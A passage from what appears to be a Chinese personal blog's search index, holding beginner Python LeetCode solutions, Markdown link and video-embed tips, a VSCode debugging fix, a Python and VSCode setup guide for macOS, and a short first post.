    <content type="text"><![CDATA[题目链接 题目给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。 设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。 注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。 示例 1:1234输入: [7,1,5,3,6,4]输出: 7解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。 随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。 示例 2:12345输入: [1,2,3,4,5]输出: 4解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。 注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。 因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。 示例 3:123输入: [7,6,4,3,1]输出: 0解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。 解答分析从题目中分析，要求只能保留一只股票，并且尽可能完成多的交易。 于是我开始尝试从从第一个低于第二天价格的位置买入，然后在第一个高于此价格的位置卖出，然后再从下一个低于后续价格的位置买入，然后在最近的高于此价格位置卖出。经过计算，我发现按照这种方式，所有的买入和卖出操作都是发生在相邻元素的，也就是列表的 i和i+1位置。并且在计算了实例的三个用例后，结果符合预期。同时，这也符合 贪心算法 的思路。 进而得出结论，只要计算列表中所有相邻元素的差值，最大收益即为所有差值大于0的结果的和。 从列表长度方面分析，当列表为空，或者只有一个元素的时候，不满足买入卖出条件，所以可以在计算时先行排除。 方式一123456789101112131415161718192021class Solution1: """ 首先判断 prices长度是否小于2, 然后循环结算列表 i+1 与 i 的差, 并将大于0的结果累加。 最后返回累加结果,即为最大收益 """ def maxProfit(self, prices): """ :type prices: List[int] :rtype: int """ max_profit = 0 if len(prices) &lt; 2: return max_profit for i in range(len(prices) - 1): profit = prices[i + 1] - prices[i] if profit &gt; 0: max_profit += profit return max_profit 时间复杂度：O(N) ， 空间复杂度： O(1) 方式二只是写了一个列表解析^jiexi，一行完成。 实际性能不如方式一。 123456789101112class Solution2:"""解题思路与方式一相同，列表 i+1 与 i 元素相减，并将大于0的结果相加。只是改用了列表解析的方式，来写成一行。 """ def maxProfit(self, prices): """ :type prices: List[int] :rtype: int """ return int((sum(list((prices[i + 1] - prices[i]) + abs(prices[i + 1] - prices[i])for i in range(len(prices) - 1)))) / 2) 时间复杂度：O(N)，空间复杂度：O(N) 思考由于是刚开始接触算法题，最开始看到这道题的时候有些摸不着头脑。不知道从哪里入手，比如怎么找出差值最大的和，是先判断间隔为1的差值，在判断间隔为2的差值…但是沉下心来，在纸上进行一些尝试后，找出适用于用例的计算方式，很快就找到了这个规律，直接找出相邻的差值即可。然后写成代码进行验证，符合预期。]]></content>
      <categories>
        <category>LeetCode</category>
        <category>Python Tips</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>贪心算法</tag>
        <tag>Python 列表解析</tag>
        <tag>LeetCode-Easy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode-219.存在重复元素 II | Contains Duplicate II]]></title>
    <url>%2Fleetcode-219-%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-ii-contains-duplicate-ii.html</url>
    <content type="text"><![CDATA[题目链接 题目给定一个整数数组和一个整数 k，判断数组中是否存在两个不同的索引 i 和 j，使得 nums [i] = nums [j]，并且 i 和 j 的差的绝对值最大为 k。 示例 1: 12输入: nums = [1,2,3,1], k = 3输出: true 示例 2: 12输入: nums = [1,0,1,1], k = 1输出: true 示例 3: 12输入: nums = [1,2,3,1,2,3], k = 2输出: false 解决方案思路这道题，可以直接使用一个长度为k的哈希表即可解决问题。哈希表中只会保存不重复的内容，所以通过循环，按顺序每次向哈希表中添加一个列表元素，判断哈希表长度是否增长：如果增长，就将最早加入哈希表的元素删除，以保持哈希表长度位k；如果长度不变，即找到了列表中满足重复且索引差的绝对值最大为k的元素，题目结束。 这就相当与在一条数字组成的轨道上放置的一个长度为k的方框，只要判断框框范围内是否有重复即可，而不需要从一开始就找到所有重复元素。 此外，还可以在程序开头，先行判断： 列表是否存在重复 列表长度是否超过k 补充：这道题也可以使用字典来实现类似哈希表的操作，用key存nums[i]的值,value 存 nums[i]的索引。每当发现重复元素时（if xx in dic），判断字典中对应key的 value值是与当前元素的索引值的差，如果符合!&gt;k 这个条件，即找到结果，反之则更新字典中key的value值。 方法一：通过set来解决问题 1234567891011121314151617181920212223242526272829303132class Solution: """ 给定一个整数数组和一个整数 k，判断数组中是否存在两个不同的索引 i 和 j，使得 nums [i] = nums [j]，并且 i 和 j 的差的绝对值最大为 k。 """ # 需要使用 haseSet来解决问题 def containsNearbyDuplicate(self, nums, k): """ :type nums: List[int] :type k: int :rtype bool 使用hash set 来判断 k长度的窗口中有无重复的数字 """ # 判断nums为空的情况 if not nums: return False # 判断nums长度小于k的情况 if len(nums) &lt;= k: return len(nums) &gt; len(set(nums)) # 判断读取的前k个元素有无重复 hashset = set(nums[:k]) if len(hashset) &lt; k: return True # 循环判断,每次按顺序添加一个元素到set中,判断长度.如果为k,证明新加入的元素与set中的存在重复,条件成立. # 否则,就将set中最早加入的元素去掉, 由于set()后会改变原nums顺序,所以需要使用remove方法,按照添加顺序去除. 即nums[i-k] for i in range(k, len(nums)): hashset.add(nums[i]) if len(hashset) == k: return True else: hashset.remove(nums[i - k]) # 这里相当于去掉了nums的第一个元素,依次类推 return False 时间复杂度：O(N), 空间复杂度 O(1) beat 98.67 % 的 python3 方法二：通过使用字典来解决问题,用key存nums[i]的值,value寸nums[i]的索引 1234567891011121314151617class Solution: def containsNearbyDuplicate(self, nums, k): """ :type nums: List[int] :type k: int :rtype: bool """ #利用字典存储数据，以便查询，key为数字，value为对应索引 dic = &#123;&#125; for index, value in enumerate(nums): if value in dic and index - dic[value] &lt;= k: return True else: dic[value] = index # Q: 如果发现重复的数字但是不满足k的条件,如何处理 # A: dic使用value作为key,所以只会保留一个数字最新的索引,不满足条件就会被覆盖 return False 时间复杂度：O(N), 空间复杂度 O(N) 思考：看到这道题时，首先想到的思路是分步进行操作： 判断列表是否存在重复元素 找出重复的元素，并返回set()后的结果 找出每个重复元素在列表中的所有位置的索引 判断这些索引之间的差，是否存在 不超过k的结果。我按照这个思路分块写出了代码后，逻辑没有任何问题，但是用时超出时间限制。 经过分析和梳理，发现自己把简单问题复杂化了，上面使用的这个set(),就可以直接解决问题。 在练习算法题的时候，如果自己安装逻辑方式的解法不满足题目要求，尝试多动手在本子上画一画，或者说进行一些空间想象，可能会找出更好的方案。例如这道题，其实就像一个数组轨道上加一个长度为k的方框这样的东西。不需要考虑方框外的情况，只要确认方框内的数组满足条件即可。 最开始，想的很复杂的解决方式：]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>LeetCode-Easy</tag>
        <tag>哈希表</tag>
        <tag>列表</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过MarkDown编写blog进阶技巧]]></title>
    <url>%2F%E9%80%9A%E8%BF%87markdown%E7%BC%96%E5%86%99blog%E8%BF%9B%E9%98%B6%E6%8A%80%E5%B7%A7.html</url>
    <content type="text"><![CDATA[在MarkDown中插入链接的一些技巧1. 直接添加链接1&lt;http://nsdf.top/&gt; http://nsdf.top/ 2. 一般的链接123丁帆的blog： [nsdf.top](http://nsdf.top/)丁帆的blog： [nsdf.top](http://nsdf.top/ "丁帆的博客") 丁帆的blog： nsdf.top 丁帆的blog： nsdf.top 3. 相对链接链接至自己blog中的其他文章等内容：12[个人博客搭建踩坑指南](/2018/08/18/一些推荐的文章/)[封面图片](/img/post_bg_apple_ad.jpg) 个人博客搭建踩坑指南 封面图片 注:此为Jekyll内容,待修改 4. 在图片中嵌入链接1[![apple-touch-icon](/images/post/blog-logo.png))](http://nsdf.top/) ) 注: 此功能在基于Jekyll的blog中为点击图片前往链接;在基于Heox+NexT的blog中,为点击图片下方链接跳转. !!!待修改 5. 在新标签中打开连接1[nsdf.top](http://nsdf.top/)&#123;:target=&quot;_blank&quot;&#125; nsdf.top{:target=”_blank”} 注: 在之前使用的基于Jekyll的Blog中,这个功能可用且需要. 在当前基于Heox+NexT的blog中,不需要这样写. 在MarkDown中插入视频在MarkDown中，只要使用 &lt;iframe&gt; 标签就可以方便的插入视频了。 关于 &lt;iframe&gt; 的更多信息： w3school-HTML-iframe 标签 下面的示例中，分别演示了插入 腾讯，优酷，YouTube，哔哩哔哩 这几个网站的视频的操作 示例：1. 腾讯视频 打开一个视频，点击下方分享按钮，然后复制通用代码 将复制的代码粘贴至MarkDown文件中。 这样就完成了。 1&lt;center&gt;&lt;iframe frameborder="0" width="640" height="498" src="https://v.qq.com/iframe/player.html?vid=j0600cjxtp0&amp;tiny=0&amp;auto=0" allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt; 另外，如果需要视频居中显示，可能还需要（视blog而定）添加一个&lt;center&gt;标签。 最终效果如下： 2. 优酷 同样的，打开一个视频，点击分享，然后复制通用代码 将代码粘贴至MarkDown文件中。就完成了 1&lt;iframe height=498 width=510 src='http://player.youku.com/embed/XMTg0MTQ4NDk4OA==' frameborder=0 'allowfullscreen'&gt;&lt;/iframe&gt; 效果如下 我发现在我常用的Safari以及chrome浏览器中，无法识别优酷的这种写法。于是我将代码改为了下面的写法，主要是将 height,width,frameborder 的数值加上双引号，将src链接改为双引号，最后将allowfullscreen单引号去掉 1&lt;iframe height="498" width="510" src="http://player.youku.com/embed/XMTg0MTQ4NDk4OA==" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt; 3. YouTube 直接在视频上右击，选择复制嵌入代码，然后粘贴至MarkDown中即可。 效果如下 1&lt;iframe width=&quot;919&quot; height=&quot;525&quot; src=&quot;https://www.youtube.com/embed/LcGPI2tV2yY&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen&gt;&lt;/iframe&gt; 4. 哔哩哔哩 基本流程也一样，具体看下面截图就好了。需要注意的是，哔哩哔哩复制来的嵌入代码的src 缺少 https:，我需要补上这个，链接才会恢复正常。同时，还需要添加窗口尺寸等设置。 具体操作： 在网站中复制嵌入代码： 修改复制到的嵌入代码： 原本的： 1&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=1031924&amp;cid=1494043&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&gt;&lt;/iframe&gt; 修改后: 1&lt;iframe width=&quot;640&quot; height=&quot;498&quot; src=&quot;https://player.bilibili.com/player.html?aid=1031924&amp;cid=1494043&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&gt;&lt;/iframe&gt; 效果]]></content>
      <categories>
        <category>基于 Heox + NexT 的 blog 搭建</category>
      </categories>
      <tags>
        <tag>MarkDown</tag>
        <tag>iframe</tag>
        <tag>链接跳转</tag>
        <tag>图片链接</tag>
        <tag>blog技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些值得推荐的内容]]></title>
    <url>%2F%E4%B8%80%E4%BA%9B%E5%80%BC%E5%BE%97%E6%8E%A8%E8%8D%90%E7%9A%84%E5%86%85%E5%AE%B9.html</url>
    <content type="text"><![CDATA[macOS ibuick - macOS 与 external GPU (eGPU) 非常详细的关于 macOS 下 外置显卡 (eGPU) 的设置，使用以及注意事项 的文章。]]></content>
      <tags>
        <tag>macOS</tag>
        <tag>推荐</tag>
        <tag>eGPU Mac外置显卡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VSCode 中使用 Python 异常报错 FileNotFoundError 的解决办法]]></title>
    <url>%2Fvscode-%E4%B8%AD%E4%BD%BF%E7%94%A8-python-%E5%BC%82%E5%B8%B8%E6%8A%A5%E9%94%99-filenotfounderror-%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html</url>
    <content type="text"><![CDATA[问题在vscode中使用Python,通过建立一个Python程序读取同一子目录下的txt文件, 并打印其内容. 预期结果程序读取同一个子目录中的 content.txt 文件, 然后打印其内容:12stay hungrystay foolish 实际结果通过debug, 提示如下错误:1FileNotFoundError: [Errno 2] No such file or directory: &apos;content.txt&apos; 错误分析vscode在进行debug时,使用的路径并不是当前python文件所在的目录,而是固定为项目文件夹的根目录.所以当程序试图从根目录寻找此文件时,自然会报错.于是我进一步尝试将文本文件移动至项目的根目录,错误消失.所以,解决问题的关键就是修改vscode在进行debug时使用的目录,使其自动的指向当前python文件所在目录. 解决方案初步思路是通过在 VSCode 的 Setting 中或者 debug 的配置文件中进行配置，来解决这个问题。通过 Google 后，我在 StackOverflow 上找到了具体解决方案。 参考链接: Stack Overflow - VSCode — how to set working directory for debug Stack Overflow - vscode working directory when debugging python 解决方式点击vscode侧边的调试按钮,在出现的侧栏顶端找到设置按钮(图中齿轮图标), 点击打开 launch.json 文件, 在文件中找到当前所用调试的方式, 添加cwd配置 &quot;cwd&quot;: &quot;&quot;. (我这里使用的是 Python: Terminal (integrated)) 添加完成后, 在此debug程序, 发现错误消失. 补充每次打开一个新的项目文件夹时, 都需要重新在launch.json文件中重新配置参数.]]></content>
      <categories>
        <category>Visual Studio Code</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>FileNotFoundError</tag>
        <tag>cwd</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac 上使用 Visual Studio Code 进行 Python 开发]]></title>
    <url>%2Fmac-%E4%B8%8A%E4%BD%BF%E7%94%A8-visual-studio-code-%E8%BF%9B%E8%A1%8C-python-%E5%BC%80%E5%8F%91.html</url>
    <content type="text"><![CDATA[在Visual Studio Code 的官方网站中，已经有在 VSCode 上使用 Python 的详细配置了， 链接：Python in Visual Studio Code{:target=”_blank”} Python 的安装 (macOS)检查已安装的 Python 版本 检查是否安装了python2 12345$ pythonPython 2.7.15 (default, Jun 17 2018, 12:46:58) [GCC 4.2.1 Compatible Apple LLVM 9.1.0 (clang-902.0.39.2)] on darwinType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; 检查是否安装了python3 12345$ python3Python 3.6.6 (v3.6.6:4cf1f54eb7, Jun 26 2018, 19:50:54) [GCC 4.2.1 Compatible Apple LLVM 6.0 (clang-600.0.57)] on darwinType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; 如果得到以上输出，则表示对应的版本已安装。 使用 Homebrew 来安装 Python3 安装Homebrew Homebrew依赖于Apple包Xcode，需要先进行安装。出现的对话框点OK即可。 1$ xcode-select --install 安装Homebrew： 1$ /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 确认Homebrew安装正确 1$ brew doctor 安装Python3 1$ brew install python3 确认安装版本 12$ python3 --versionPython 3.6.6 VSCode 的配置安装VSCode的Python扩展插件 点击图片下的链接可以前往安装，直接点击Install安装即可。或者也可以直接在VSCode的扩展栏（Shift + Command + X）中搜索Python，安装下载量最高的那个。安装完成后，就可以使用VSCode编辑python代码了，按F5即可进行debug。 设置调试使用的 Python 版本Mac上自带的 Python 版本为 2.7.x，VSCode 的调试（Python:Terminal(intergrated）)默认会使用系统自带的 Python 版本。而如果我们另外安装了 Python3，希望用 Python3 进行调试的时候，就需要修改一下 VSCode 的设置了。 设置步骤: 打开VSCode用户设置（Code - 首选项 - 设置） 输入&quot;python.pythonPath&quot;:&quot;python3&quot;, 以下两个插件需要预先安装pip 配置yapf yapf简介 yapf{:target=”_blank”}是一个源代码格式化工具，可以辅助我们进行代码的格式化，安装完成后，通过快捷键 Shift + Alt + F 执行代码的格式化。 安装步骤 打开命令行，输入 pip install yapf 安装成功后， 打开VSCode用户设置（Code - 首选项 - 设置） 在setting.json文件中， 输入&quot;python.formatting.provider&quot;: &quot;yapf&quot;, yapf使用技巧 设置 代码段禁用自动格式化 通过 # yapf: disable 以及 # yapf: enable， 将不需要调整格式的代码段包括其中，即可在某些代码段禁用自动格式化。 123# yapf: disable# 这里的代码不会被自动调整格式# yapf: enable 2. 更多yafp用法参考 在终端中输入：`$ yapf -h`，查看相关帮助。 配置flake8 flake8 简介 Flake8{:target=”_blank”}包装了下列工具： PyFlakes：静态检查Python代码逻辑错误的工具。 pep8： 静态检查PEP 8编码风格的工具。 Ned Batchelder’s McCabe script：静态分析Python代码复杂度的工具。通过flake8可以帮助我们避免以及查找错误，并规范格式。 安装步骤： 打开命令行，输入 pip install flake8 打开VSCode用户设置（Code - 首选项 - 设置） 在setting.json文件中， 输入&quot;python.linting.flake8Enabled&quot;:true, flake8 的一些配置： 如果我们的使用习惯和flake8的默认设定有冲突，可以对flake8进行配置。 在控制台中，输入 flake8 --help， 会显示flake8可以设置的参数。我们可以在VSCode的Setting中对flake8的这些参数进行设置。 在用户设置中添加 &quot;python.linting.flake8Args&quot;: [], 这条设置，并在其中添加需要修改的条目即可。 调整flake8单行代码长度的检测： 12// 单行代码最大长度改为300&quot;python.linting.flake8Args&quot;: [&quot;--max-line-length=300&quot;] VSCode 的其他设置 设置代码长度 12// 80，120 表示分别在80和120字符处显示一条辅助线，可以进行设置和调整。&quot;editor.rulers&quot;: [80,120] 参考 post-image: pixiv-id-6675416{:target=”_blank”} vscode 编写python如何禁止 flake8 提示 line too long{:target=”_blank”} 《Python编程：从入门到实践》{:target=”_blank”}]]></content>
      <categories>
        <category>Visual Studio Code</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Visual Studio Code</tag>
        <tag>Python安装&amp;配置</tag>
        <tag>yapf</tag>
        <tag>flake8</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的第一篇Blog]]></title>
    <url>%2F%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87blog.html</url>
    <content type="text"><![CDATA[Hey 这是我的第一篇博客. 从很早以前就希望可以有一个自己的个人博客, 但是由于种种原因, 一直到现在才付诸实施.希望自己可以一直坚持下去, 不断改进自己的博客, 与它一起成长.同时也希望我分享的内容, 能够帮到此刻正在看我博客的你.]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
</search>
